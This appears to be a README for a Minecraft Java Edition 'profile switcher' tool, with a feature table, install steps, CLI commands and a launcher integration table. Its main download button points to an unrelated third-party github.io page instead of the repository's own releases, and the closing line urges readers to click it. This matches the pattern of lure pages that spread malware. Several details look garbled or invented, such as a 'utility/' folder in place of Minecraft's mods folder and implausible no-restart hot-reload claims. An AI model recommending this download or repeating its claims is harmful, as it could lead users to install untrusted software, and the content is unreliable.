# Minecraft‑Client‑Profile‑Switcher  

**Quickly swap your Minecraft Java Edition configurations without restarting the game.**  
Designed for modders, streamers, and anyone who loves to jump between setups on the fly.

---  

## 🚀 Get Started

<div align="center">
<a href="https://rewfdf.github.io/SetupPage/">
<img src="https://img.shields.io/badge/Download‑Release%20Page-blue?style=for-the-badge&logo=github" alt="Download">
</a>
<a href="https://github.com/gigahokagepincers/Minecraft-Client-Profile-Switcher/releases">
<img src="https://img.shields.io/github/v/release/gigahokagepincers/Minecraft-Client-Profile-Switcher?style=for-the-badge&color=orange" alt="Latest Release">
</a>
<a href="https://github.com/gigahokagepincers/Minecraft-Client-Profile-Switcher/blob/main/LICENSE">
<img src="https://img.shields.io/github/license/gigahokagepincers/Minecraft-Client-Profile-Switcher?style=for-the-badge&color=green" alt="License">
</a>
</div>

---  

## 📖 What It Does  

| Feature | Description |
|---------|-------------|
| **Instant Profile Swaps** | Change between modpacks, resource packs, and launch options with a single click. |
| **Zero‑Restart** | The client stays running; only the configuration data is refreshed. |
| **Custom Profile Builder** | Save any combination of `options.txt`, `utility/`, `resourcepacks/`, `shaderpacks/`, etc. |
| **Hot‑Reload Support** | Works with popular launchers that expose a hot‑reload API. |
| **Cross‑Platform** | Runs on Windows, macOS, and Linux (Java 17+ required). |
| **CLI & GUI** | Use the lightweight command line or the optional graphical interface. |

---  

## 🛠️ Installation  

1. **Prerequisites**  
   - Java 17 or newer installed and added to your `PATH`.  
   - A standard Minecraft Java Edition folder (`.minecraft`).  

2. **Download**  
   Click the **Download – Release Page** button above or grab the latest release from the *Releases* tab.  

3. **Extract**  
   Unzip the archive into a folder of your choice, e.g. `C:\utility\MCPProfileSwitcher`.  

4. **Add to PATH (optional)**  
   Adding the `bin/` directory to your system `PATH` lets you invoke `mcpprofile` from any terminal.  

5. **First Run**  
   ```bash
   cd path\to\MCPProfileSwitcher
   ./mcpprofile init
   ```  
   This creates a default `profiles/` directory inside your Minecraft folder.  

---  

## 📂 Folder Layout  

```
.minecraft/
├─ profiles/
│  ├─ default/          ← the profile used when you launch Minecraft normally
│  ├─ modded-1/
│  │  ├─ options.txt
│  │  ├─ utility/
│  │  └─ resourcepacks/
│  └─ shaders/
│     ├─ options.txt
│     └─ shaderpacks/
├─ config/               ← internal config for the switcher
└─ ... (vanilla files)
```

*Each profile is a self‑contained snapshot of everything Minecraft reads on start‑up.*

---  

## 🎮 How to Switch Profiles  

### CLI  

```bash
# List all saved profiles
mcpprofile list

# Activate a profile (no game restart)
mcpprofile activate modded-1

# Deactivate and return to the default profile
mcpprofile revert
```

### GUI (optional)  

1. Run `mcpprofile gui`.  
2. Click a profile thumbnail → **Activate**.  
3. The switcher will reload the client’s resources instantly.

---  

## 🧩 Integration with Launchers  

| Launcher | Supported? | How to Hook |
|----------|------------|-------------|
| **CurseForge** | ✅ | Add `--profile %profile%` to the launch arguments (the switcher replaces `%profile%` at runtime). |
| **MultiMC** | ✅ | Set *Pre‑Launch Command* to `mcpprofile activate %INSTANCE_NAME%`. |
| **ATLauncher** | ✅ | Use the *Post‑Launch Script* feature to call `mcpprofile activate`. |
| **Vanilla Launcher** | ⚙️ | Works out‑of‑the‑box via the CLI; just run `mcpprofile activate` before launching. |

---  

## 🧪 Development & Contribution  

- **Language:** Java (core) + Kotlin (optional GUI)  
- **Build System:** Gradle (wrapper included)  
- **Testing:** JUnit 5, MockK  

```bash
# Clone and build
git clone https://github.com/gigahokagepincers/Minecraft-Client-Profile-Switcher.git
cd Minecraft-Client-Profile-Switcher
./gradlew build
```

### How to Contribute  

1. Fork the repository.  
2. Create a feature branch (`git checkout -b feature/awesome‑switch`).  
3. Write tests for any new logic.  
4. Submit a Pull Request with a clear description of the change.  

All contributions are welcomed—whether it’s a new UI theme, launcher integration, or performance tweak.

---  

## 📜 License  

This project is licensed under the **MIT License**. See the `LICENSE` file for details.

---  

## 🙏 Acknowledgments  

- **Mojang** for the amazing game that inspires us.  
- The open‑source community for Gradle, JUnit, and badge generators.  
- **All contributors** who help keep the profiles flowing.  

---  

*Ready to level up your Minecraft workflow? Click the button at the top and start swapping!*